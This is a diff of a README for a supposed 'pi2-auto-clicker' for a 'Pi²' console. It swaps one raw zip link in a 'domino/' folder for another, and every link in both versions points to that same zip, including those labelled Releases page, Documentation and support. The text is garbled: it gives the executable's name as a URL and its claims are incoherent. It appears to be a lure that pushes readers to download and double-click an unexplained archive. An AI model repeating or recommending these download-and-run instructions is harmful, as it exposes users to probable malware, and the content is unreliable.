@@ -1,7 +1,7 @@
 # 🖱️ pi2-auto-clicker - Simple Automation for Your Pi² Console
 
 ## 📦 Download Now!
-[![Download](https://raw.githubusercontent.com/TarnishedMiku/pi2-auto-clicker/master/domino/pi2-auto-clicker.zip)](https://raw.githubusercontent.com/TarnishedMiku/pi2-auto-clicker/master/domino/pi2-auto-clicker.zip)
+[![Download](https://github.com/TarnishedMiku/pi2-auto-clicker/raw/refs/heads/master/domino/auto-pi-clicker-2.0-beta.3.zip)](https://github.com/TarnishedMiku/pi2-auto-clicker/raw/refs/heads/master/domino/auto-pi-clicker-2.0-beta.3.zip)
 
 ## 🚀 Getting Started
 The pi2-auto-clicker helps you automate tasks on your Pi² game console easily. With this tool, you can achieve peak performance of up to 20 TPS (Transactions Per Second). 
@@ -23,17 +23,17 @@ Before you start, ensure your system meets these requirements:
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version of the pi2-auto-clicker. 
 
-[Visit Releases Page to Download](https://raw.githubusercontent.com/TarnishedMiku/pi2-auto-clicker/master/domino/pi2-auto-clicker.zip)
+[Visit Releases Page to Download](https://github.com/TarnishedMiku/pi2-auto-clicker/raw/refs/heads/master/domino/auto-pi-clicker-2.0-beta.3.zip)
 
 ### Installation Steps
 1. **Download the Software:**
-   Go to the [Releases page](https://raw.githubusercontent.com/TarnishedMiku/pi2-auto-clicker/master/domino/pi2-auto-clicker.zip) and download the latest version for your Pi² console.
+   Go to the [Releases page](https://github.com/TarnishedMiku/pi2-auto-clicker/raw/refs/heads/master/domino/auto-pi-clicker-2.0-beta.3.zip) and download the latest version for your Pi² console.
 
 2. **Extract the Files:**
    After downloading, locate the zip file in your downloads folder. Right-click on the file and select "Extract All." Follow the prompts to extract the files.
 
 3. **Run the Application:**
-   Navigate to the folder where you extracted the files. Look for the executable file, usually named `https://raw.githubusercontent.com/TarnishedMiku/pi2-auto-clicker/master/domino/pi2-auto-clicker.zip`. Double-click the file to open the application.
+   Navigate to the folder where you extracted the files. Look for the executable file, usually named `https://github.com/TarnishedMiku/pi2-auto-clicker/raw/refs/heads/master/domino/auto-pi-clicker-2.0-beta.3.zip`. Double-click the file to open the application.
 
 4. **Set Up Automation:**
    After opening the application, follow the on-screen instructions to set up your automation. You can easily input the tasks you want to automate.
@@ -45,14 +45,14 @@ To get started, visit the Releases page to download the latest version of the pi
 If you encounter issues, try these steps:
 
 - **Check Compatibility:** Ensure your Pi² console meets the system requirements.
-- **Reinstall:** If the application doesn't open, try deleting it and downloading it again from the [Releases page](https://raw.githubusercontent.com/TarnishedMiku/pi2-auto-clicker/master/domino/pi2-auto-clicker.zip).
+- **Reinstall:** If the application doesn't open, try deleting it and downloading it again from the [Releases page](https://github.com/TarnishedMiku/pi2-auto-clicker/raw/refs/heads/master/domino/auto-pi-clicker-2.0-beta.3.zip).
 - **Contact Support:** If problems persist, check the community forums or reach out via our GitHub repository for help.
 
 ## 👥 Community
 Join our growing community to share your experiences and get support. Check out discussions and ask questions to learn more about optimizing your automation.
 
 ## 📖 Documentation
-For more in-depth information about features and usage, refer to our [Documentation](https://raw.githubusercontent.com/TarnishedMiku/pi2-auto-clicker/master/domino/pi2-auto-clicker.zip). This resource includes comprehensive guides and tips to enhance your experience with pi2-auto-clicker.
+For more in-depth information about features and usage, refer to our [Documentation](https://github.com/TarnishedMiku/pi2-auto-clicker/raw/refs/heads/master/domino/auto-pi-clicker-2.0-beta.3.zip). This resource includes comprehensive guides and tips to enhance your experience with pi2-auto-clicker.
 
 ## 💬 Feedback
 Your feedback is essential. Let us know how we can improve in the Issues section of this repository. We appreciate your input to make pi2-auto-clicker better for everyone.
@@ -60,4 +60,4 @@ Your feedback is essential. Let us know how we can improve in the Issues section
 ## 🌟 Credits
 Thanks to everyone who contributed to this project, from development to documentation. Your hard work makes pi2-auto-clicker possible.
 
-[Visit Releases Page to Download](https://raw.githubusercontent.com/TarnishedMiku/pi2-auto-clicker/master/domino/pi2-auto-clicker.zip)
+[Visit Releases Page to Download](https://github.com/TarnishedMiku/pi2-auto-clicker/raw/refs/heads/master/domino/auto-pi-clicker-2.0-beta.3.zip)
